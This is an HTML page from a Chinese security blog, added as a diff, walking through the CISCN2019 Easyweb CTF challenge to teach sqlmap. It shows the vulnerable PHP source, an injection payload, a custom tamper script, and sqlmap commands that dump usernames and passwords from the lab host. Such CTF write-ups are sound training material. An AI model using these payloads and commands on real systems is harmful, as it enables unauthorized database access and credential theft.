@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='通过例题讲了sqlmap的使用'><title>sqlmap使用实例</title>
+
+<link rel='canonical' href='https://proben1.github.io/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/'>
+
+<link rel="stylesheet" href="/scss/style.min.ddb7a2bc30312e4584c50c2205f5488bbcb69c747900d22926b3f0be637b190f.css"><meta property='og:title' content='sqlmap使用实例'>
+<meta property='og:description' content='通过例题讲了sqlmap的使用'>
+<meta property='og:url' content='https://proben1.github.io/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/'>
+<meta property='og:site_name' content='茄子的养殖场'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='' /><meta property='article:tag' content='SQL注入' /><meta property='article:published_time' content='2022-05-03T21:08:57&#43;08:00'/><meta property='article:modified_time' content='2022-05-03T21:08:57&#43;08:00'/>
+<meta name="twitter:title" content="sqlmap使用实例">
+<meta name="twitter:description" content="通过例题讲了sqlmap的使用"><style>
+    :root {
+        --article-font-family: "Noto Serif SC", var(--base-font-family);
+    }
+</style>
+
+<script> 
+		(function () {
+		    const customFont = document.createElement('link');
+		    customFont.href = "https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap"; 
+		    customFont.type = "text/css";
+		    customFont.rel = "stylesheet";
+		
+		    document.head.appendChild(customFont);
+		}());
+</script>
+
+    </head>
+    <body class="
+    article-page
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    <!-- 
+        on-phone--column extended
+     -->
+    on-phone--column extended
+">
+    
+<div id="article-toolbar">
+    <a href="https://proben1.github.io/" class="back-home">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+        <span>Back</span>
+    </a>
+</div>
+    <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu5f6318bf2277bd145affa4ac152aafed_74595_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <h1 class="site-name"><a href="/">茄子的养殖场</a></h1>
+        <h2 class="site-description">完成一个名为大学的作品</h2><ol class="social-menu">
+                
+                    <li>
+                        <a 
+                            href='https://github.com/ProbeN1'
+                            target="_blank"
+                            title="GitHub"
+                        >
+                            
+                            
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                            
+                        </a>
+                    </li>
+                
+            </ol></header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E%E6%88%91/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于我</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                网络安全
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/">sqlmap使用实例</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        通过例题讲了sqlmap的使用
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 03, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-words">
+                    2166字
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>学安全的时候第一件事就是在学长要求下安了sqlmap，可到现在还是只会这个：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sqlmap -u &#34;url&#34;
+sqlmap -u &#34;url&#34; --dbs
+sqlmap -u &#34;url&#34; -D xx --tables 
+sqlmap -u &#34;url&#34; -D xx -T xx --columns
+sqlmap -u &#34;url&#34; -D xx -T xx -C xx,xx --dump
+</code></pre></div><p>或者一个post，把包抓下来，用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sqlmap -r post.txt
+</code></pre></div><p>今天就用一道题来演示一下，sqlmap的其他功能：</p>
+<p>题目是：[CISCN2019 总决赛 Day2 Web1]Easyweb</p>
+<p>源码：https://github.com/glzjin/CISCN_2019_Final_12_Day2_Web1</p>
+<p>或者直接buu搜……</p>
+<p>首先来审下题，robots.txt泄露出存在*.php.bak，再挨个php试一下，可以下载到image.php.bak，下面是审计部分，和sqlmap没关系，可以直接跳到结果部分</p>
+<p>源码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
+<span style="color:#ff79c6">include</span> <span style="color:#f1fa8c">&#34;config.php&#34;</span>;
+
+<span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#ff79c6">=</span>isset(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;id&#34;</span>])<span style="color:#ff79c6">?</span><span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;id&#34;</span>]<span style="color:#ff79c6">:</span><span style="color:#f1fa8c">&#34;1&#34;</span>;
+<span style="color:#8be9fd;font-style:italic">$path</span><span style="color:#ff79c6">=</span>isset(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;path&#34;</span>])<span style="color:#ff79c6">?</span><span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;path&#34;</span>]<span style="color:#ff79c6">:</span><span style="color:#f1fa8c">&#34;&#34;</span>;
+
+<span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#ff79c6">=</span>addslashes(<span style="color:#8be9fd;font-style:italic">$id</span>);
+<span style="color:#8be9fd;font-style:italic">$path</span><span style="color:#ff79c6">=</span>addslashes(<span style="color:#8be9fd;font-style:italic">$path</span>);
+
+<span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#ff79c6">=</span>str_replace(<span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">0&#34;</span>,<span style="color:#f1fa8c">&#34;%00&#34;</span>,<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">&#39;&#34;</span>,<span style="color:#f1fa8c">&#34;&#39;&#34;</span>),<span style="color:#f1fa8c">&#34;&#34;</span>,<span style="color:#8be9fd;font-style:italic">$id</span>);
+<span style="color:#8be9fd;font-style:italic">$path</span><span style="color:#ff79c6">=</span>str_replace(<span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">0&#34;</span>,<span style="color:#f1fa8c">&#34;%00&#34;</span>,<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">&#39;&#34;</span>,<span style="color:#f1fa8c">&#34;&#39;&#34;</span>),<span style="color:#f1fa8c">&#34;&#34;</span>,<span style="color:#8be9fd;font-style:italic">$path</span>);
+
+<span style="color:#8be9fd;font-style:italic">$result</span><span style="color:#ff79c6">=</span>mysqli_query(<span style="color:#8be9fd;font-style:italic">$con</span>,<span style="color:#f1fa8c">&#34;select * from images where id=&#39;</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39; or path=&#39;</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">$path</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;&#34;</span>);
+<span style="color:#8be9fd;font-style:italic">$row</span><span style="color:#ff79c6">=</span>mysqli_fetch_array(<span style="color:#8be9fd;font-style:italic">$result</span>,MYSQLI_ASSOC);
+
+<span style="color:#8be9fd;font-style:italic">$path</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;./&#34;</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$row</span>[<span style="color:#f1fa8c">&#34;path&#34;</span>];
+header(<span style="color:#f1fa8c">&#34;Content-Type: image/jpeg&#34;</span>);
+readfile(<span style="color:#8be9fd;font-style:italic">$path</span>);
+</code></pre></div><p>我们发现addslashes()和str_replace()一起使用引起了安全隐患，当我们id输入为\0时，测试如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
+
+<span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#ff79c6">=</span>isset(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;id&#34;</span>])<span style="color:#ff79c6">?</span><span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;id&#34;</span>]<span style="color:#ff79c6">:</span><span style="color:#f1fa8c">&#34;1&#34;</span>;
+<span style="color:#8be9fd;font-style:italic">$path</span><span style="color:#ff79c6">=</span>isset(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;path&#34;</span>])<span style="color:#ff79c6">?</span><span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;path&#34;</span>]<span style="color:#ff79c6">:</span><span style="color:#f1fa8c">&#34;&#34;</span>;
+
+输入：id<span style="color:#ff79c6">=</span>\0
+
+<span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#ff79c6">=</span>addslashes(<span style="color:#8be9fd;font-style:italic">$id</span>);
+<span style="color:#8be9fd;font-style:italic">$path</span><span style="color:#ff79c6">=</span>addslashes(<span style="color:#8be9fd;font-style:italic">$path</span>);
+<span style="color:#ff79c6">print</span>(<span style="color:#8be9fd;font-style:italic">$id</span>);
+<span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;br&gt;&#34;</span>;
+
+输出：\\0
+
+<span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#ff79c6">=</span>str_replace(<span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">0&#34;</span>,<span style="color:#f1fa8c">&#34;%00&#34;</span>,<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">&#39;&#34;</span>,<span style="color:#f1fa8c">&#34;&#39;&#34;</span>),<span style="color:#f1fa8c">&#34;&#34;</span>,<span style="color:#8be9fd;font-style:italic">$id</span>);
+<span style="color:#8be9fd;font-style:italic">$path</span><span style="color:#ff79c6">=</span>str_replace(<span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">0&#34;</span>,<span style="color:#f1fa8c">&#34;%00&#34;</span>,<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">&#39;&#34;</span>,<span style="color:#f1fa8c">&#34;&#39;&#34;</span>),<span style="color:#f1fa8c">&#34;&#34;</span>,<span style="color:#8be9fd;font-style:italic">$path</span>);
+
+<span style="color:#ff79c6">print</span>(<span style="color:#8be9fd;font-style:italic">$id</span>);
+<span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;br&gt;&#34;</span>;
+
+输出：\
+
+<span style="color:#8be9fd;font-style:italic">$result</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;select * from images where id=&#39;</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39; or path=&#39;</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">$path</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;&#34;</span>;
+
+
+<span style="color:#8be9fd;font-style:italic">$path</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;./&#34;</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$row</span>[<span style="color:#f1fa8c">&#34;path&#34;</span>];
+
+
+<span style="color:#ff79c6">print</span>(<span style="color:#8be9fd;font-style:italic">$result</span>);
+
+输出：select <span style="color:#ff79c6">*</span> from images where id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;\&#39; or path=&#39;</span> <span style="color:#ff79c6">or</span> <span style="color:#bd93f9">1</span><span style="color:#6272a4">#&#39;
+</span></code></pre></div><p>可以发现最终的形式是这样的：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">select * from images where id=&#39;xxx&#39; or 1#&#39;
+</code></pre></div><p>得出结果：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">id=\0&amp;path= or 1=1 %23
+</code></pre></div><p>更改or后面的值可以更改payload。由于网页正确时会返回图片，我们使用布尔盲注或者时间盲注都可以。</p>
+<p>下面演示一下使用sqlmap该怎么对这道题进行时间盲注：</p>
+<p>首先是tamper脚本的编写：</p>
+<p>在sqlmap/tamper/里新建自己中意名字的python脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> sys
+sys<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>append(<span style="color:#f1fa8c">&#34;E:</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">tools</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">sqlmap&#34;</span>)
+<span style="color:#ff79c6">from</span> lib.core.enums <span style="color:#ff79c6">import</span> PRIORITY
+<span style="color:#ff79c6">from</span> lib.core.common <span style="color:#ff79c6">import</span> singleTimeWarnMessage
+__priority__ <span style="color:#ff79c6">=</span> PRIORITY<span style="color:#ff79c6">.</span>LOW <span style="color:#6272a4"># 当前脚本调用优先等级</span>
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">dependencies</span>(): <span style="color:#6272a4"># 声明当前脚本适用/不适用的范围，可以为空。</span>
+    singleTimeWarnMessage(<span style="color:#f1fa8c">&#34;这是我的tamper提示&#34;</span>)
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">tamper</span>(payload, <span style="color:#ff79c6">**</span>kwargs): <span style="color:#6272a4"># 用于篡改Payload、以及请求头的主要函数</span>
+    payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34; or &#34;</span><span style="color:#ff79c6">+</span>payload<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;%23&#34;</span>
+    <span style="color:#ff79c6">return</span> payload
+</code></pre></div><p>一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义，</p>
+<p>priority定义脚本的优先级，用于有多个tamper脚本的情况，查看lib.core.enums里的PRIORITY类可以看到详细的定义级别：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">PRIORITY</span>(<span style="color:#8be9fd;font-style:italic">object</span>):
+    LOWEST <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">100</span>
+    LOWER <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">50</span>
+    LOW <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">10</span>
+    NORMAL <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+    HIGH <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">10</span>
+    HIGHER <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">50</span>
+    HIGHEST <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">100</span>
+</code></pre></div><p>dependencies函数声明该脚本适用/不适用的范围，可以为空；</p>
+<p>刚才例子里使用的<code>singleTimeWarnMessage() </code>用于在控制台中打印出警告信息：</p>
+<p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/627261fc09475431295dc61e.jpg" >
+		<img src="https://pic.imgdb.cn/item/627261fc09475431295dc61e.jpg"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>tamper是主要的函数，接受的参数为payload和**kwargs，其中payload就是所求。kwargs为相关httpheader，想插入或则修改header的时候可以用到。</p>
+<p>如例，我的tamper里就可以这么前后一加（虽然在sqlmap里也有类似的指令），然后url变成<code>http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;path=</code>，再指定注入参数为path就可以了。</p>
+<p>下面是要用到的注入命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">--current-db #查看当前的数据库
+--technique T  #指定注入类型
+　　B: Boolean-based blind SQL injection（布尔型注入）
+　　E: Error-based SQL injection（报错型注入）
+　　U: UNION query SQL injection（可联合查询注入）
+　　S: Stacked queries SQL injection（可多语句查询注入）
+　　T: Time-based blind SQL injection（基于时间延迟注入）
+　　
+-v3  #输出详细度 
+0、只显示python错误以及严重的信息。
+1、同时显示基本信息和警告信息。（默认）
+2、同时显示debug信息。
+3、同时显示注入的payload。
+4、同时显示HTTP请求。
+5、同时显示HTTP响应头。
+6、同时显示HTTP响应页面。
+
+--threads 5           #指定线程数(时间盲注不推荐开多线程)
+--dbms=&#34;MySQL&#34; #指定其数据库为mysql 
+其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB
+
+--time-sec #DBMS响应的延迟时间（默认为5秒）
+-p     #可测试的参数
+--fresh-queries     #刷新缓存
+</code></pre></div><p>库名</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python3 sqlmap.py -u &#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;path=1&#34; --tamper=my.py -v 3 --dbms=&#34;MySQL&#34; --technique=T -p path  --time-sec 4 --current-db
+</code></pre></div><p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/62725e58094754312955451b.jpg" >
+		<img src="https://pic.imgdb.cn/item/62725e58094754312955451b.jpg"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>表名</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python3 sqlmap.py -u &#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;path=1&#34; --tamper=my.py -v 3 --dbms=&#34;MySQL&#34; --technique=T -p path  --time-sec 4 -D ciscnfinal --tables
+</code></pre></div><p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/6272607009475431295a3797.jpg" >
+		<img src="https://pic.imgdb.cn/item/6272607009475431295a3797.jpg"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>字段(sqlmap自动用了16进制的绕过)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python3 sqlmap.py -u &#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;path=1&#34; --tamper=my.py -v 3 --dbms=&#34;MySQL&#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users --columns
+</code></pre></div><p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/627262bf09475431295f9d8d.jpg" >
+		<img src="https://pic.imgdb.cn/item/627262bf09475431295f9d8d.jpg"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>数据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python3 sqlmap.py -u &#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;path=1&#34; --tamper=my.py -v 3 --dbms=&#34;MySQL&#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users -C username,password --dump
+</code></pre></div><p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/6272692e09475431296f1258.jpg" >
+		<img src="https://pic.imgdb.cn/item/6272692e09475431296f1258.jpg"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>这里b2ff3D048fe0c0374fd7可耻的错了，刷新缓存之后是b2ff30048fe0c0374fd7，看来时间盲注还是错误率的hhh。</p>
+<p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/62726b99094754312974d9ee.jpg" >
+		<img src="https://pic.imgdb.cn/item/62726b99094754312974d9ee.jpg"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>这里能发现，sqlmap每次盲注的最后都使用一个<code>非</code>来确定时间盲注的判断是否成功，下面接上刷新缓存的命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python3 sqlmap.py -u &#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;path=1&#34; --tamper=my.py -v 3 --dbms=&#34;MySQL&#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users -C username,password --dump --fresh-queries
+</code></pre></div><p>完成注入，可以登录了，结束。但是这里还有很多问题，比如level还没涉及到，比如知道误报之后怎么只刷新特定的缓存……</p>
+<p>推荐一个SQLMAP进阶使用的博客：</p>
+<p><a class="link" href="http://drops.xmd5.com/static/drops/tips-5254.html"  target="_blank" rel="noopener"
+    >http://drops.xmd5.com/static/drops/tips-5254.html</a></p>
+<p>下面是一些好玩的注入命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">--referer http://www.baidu.com   #伪造referer字段
+--is-dba    #判断当前用户是否有管理员权限
